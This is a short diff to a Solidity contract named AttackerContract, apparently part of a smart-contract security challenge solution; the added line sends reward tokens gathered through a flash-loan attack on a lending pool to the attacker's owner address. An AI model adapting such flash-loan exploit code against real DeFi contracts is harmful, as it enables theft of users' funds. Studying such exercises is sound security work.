@@ -25,6 +25,7 @@ contract AttackerContract {
     function attack() public {
         require(msg.sender == owner, "Not Owner");
         flashLoanerPool.flashLoan(TOTAL_AMOUNT_TO_FLASHLOAN);
+        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
     }
 
     function receiveFlashLoan(_totalAmountToFlashLoan, uint256) public {
